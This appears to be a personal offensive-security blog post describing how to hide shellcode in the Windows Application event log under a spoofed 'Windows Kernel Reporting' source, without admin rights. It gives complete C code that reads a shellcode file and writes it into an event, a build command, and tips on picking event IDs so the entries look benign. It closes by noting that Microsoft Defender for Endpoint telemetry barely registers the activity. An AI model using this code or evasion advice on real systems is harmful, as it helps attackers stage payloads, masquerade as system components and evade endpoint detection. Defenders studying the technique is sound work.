+++
title = 'Hiding In Plain Sight (Windows) - Store Payload in Events'
date = 2026-07-27T09:33:44+02:00
draft = false
+++

## Weird but insane

Going through some different persistence techniques on Windows, I was highly inspired by one that is about storing your payload within the Windows Event Log and then retrieving it when needed. This is suuuuper funny, however, I do believe it would be rather effective.

The idea is simple:
    - Write and Event to `Application` channel with Source that looks "legit enough" and store binary data of shellcode there (gonna do simple MessageBox)
    - Retrieve the binary data and execute it

BONUS: See what's gonna get logged in terms of telemetry if you have `MDE`!!! (WOW, much WOW, MDEEEEEE). HEHE - what's gonna get logged while we are writing the events, this is quite ironic isn't it? ;)

I have also decided to write this one in C, I think the previous post with assembly was cool but it might not resontate with people that well. (Surprise that no ones cares or knows how to write/read assembly lol).

## Win32 APIs to write event

Below are the names of the Win32 APIs that we are going to utilize to write the event:

- `RegisterEventSourceW` (If source cannot be found, it defaults to Application log, perfectly fine for us. Opens handle to EventLog that we need for `ReportEventW` call)
- `ReportEventW` (Actual API that writes the event)
- `DeregisterEventSource` (Closes the EventLog handle - be good boy cleanup)

Cool sample from MS DOCS: [link](https://learn.microsoft.com/en-us/windows/win32/eventlog/reporting-an-event)

## The Code

The below code is quite simple it is referencing the Win32 APIs we talked about as well as the ones that deal with reading shellcode from the disk. (There is plethora of ways you can do it, reading file from disk is just easiest to setup).

One interesting and perhaps important thing:

If you use the program and write an event and then inspect the output in EventViewer, it will be there and Binary Data will be populated. However, you will notice a `Incorrect function.` message.

Not getting too technical but from my research I found out that in order to solve this you would need to register message source DLL for the custom event source name which would require modifying HKLM (Admin rights). By doing some more testing it actually seems that there is this fallback mechanism that in case of our code (Event ID 1) evaluates to (Windows Error Code 1: `ERROR_INVALID_FUNCTION`). You can simply change our EventID to different one like `5` and it will evaluate to `Access is denied.`.

If you want to play with Error Codes: [List Of Error Codes](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-)

In case you change it to a Event ID that fall back cannot interpret you will get:

```
The description for Event ID 10000 from source Windows Kernel Reporting cannot be found. Either the component that raises this event is not installed on your local computer or the installation is corrupted. You can install or repair the component on the local computer.

If the event originated on another computer, the display information had to be saved with the event.

The following information was included with the event: 


The message resource is present but the message was not found in the message table
```

Since I used source "Windows Kernel Reporting", the good idea would be perhaps to use EventID `323` as it evaluates to `ERROR_INTERMIXED_KERNEL_EA_OPERATION`:

```
An attempt was made to modify both a KERNEL and normal Extended Attribute (EA) in the same operation.
```

Again, something to for you to play with to make it look benign.

Let's not worry about it, the binary data gets there and we do not require Admin rights, all good!

Note: I have used custom PIC hand-written with the usage of `Crystal Palace` (something for another blog post) I do believe the usual shellcode generated from `msfvenom` should also work.


```
#include <windows.h>
#include <stdio.h>


void WriteToEventLog(const BYTE* data, DWORD size) {
    HANDLE hEventSource;

    if ((hEventSource = RegisterEventSourceW(NULL, L"Windows Kernel Reporting" )) == NULL) {
        printf("RegisterEventSource failed with error %lu\n", GetLastError());
        return;
    }

    if (!ReportEventW(hEventSource,EVENTLOG_INFORMATION_TYPE,0,1,NULL,0,size,NULL,(LPVOID)data)) {
        printf("ReportEvent failed with error %lu\n", GetLastError());
    } else {
        printf("ReportEvent Success!!\n");
    }

    if (!DeregisterEventSource(hEventSource)) {
        printf("DeregisterEventSource failed with error %lu\n", GetLastError());
    }
}
int main() {
    const char* filename = "msgbox.bin";
    HANDLE hFile;
    DWORD bytesRead, fileSize;
    BYTE* fileData;

    hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open file with error %d\n", GetLastError());
        return 1;
    }

    fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        printf("Failed to get file size with error %d\n", GetLastError());
        return 1;
    }

    fileData = (BYTE*)malloc(fileSize);
    if (!fileData) {
        CloseHandle(hFile);
        printf("Memory allocation failed.\n");
        return 1;
    }

    if (!ReadFile(hFile, fileData, fileSize, &bytesRead, NULL)) {
        free(fileData);
        CloseHandle(hFile);
        printf("Failed to read file with error %d\n", GetLastError());
        return 1;
    }
    CloseHandle(hFile);

    WriteToEventLog(fileData, fileSize);

    free(fileData);
    return 0;
}
```

Build:

```
gcc WriteToEventLog.c -o WriteToEventLog.exe
```

## MDE POV

By executing and checking the events generated within MDE, you will find your usual process execution events and that's it.

I guess for this you are only relying on your "rare executable/processes" kind of detections. <- This becomes problematic if you utilize different means than exec to perform this activity (idk, PowerShell maybe...).

Obviously, there are `Application` channel events that are generated <- these are rarely being collected, the idea would be to check for weird looking events with embedded binary data. The amount of noise events you will get is enormous. Thus I do not believe that there are good options to detect the activity at this level.
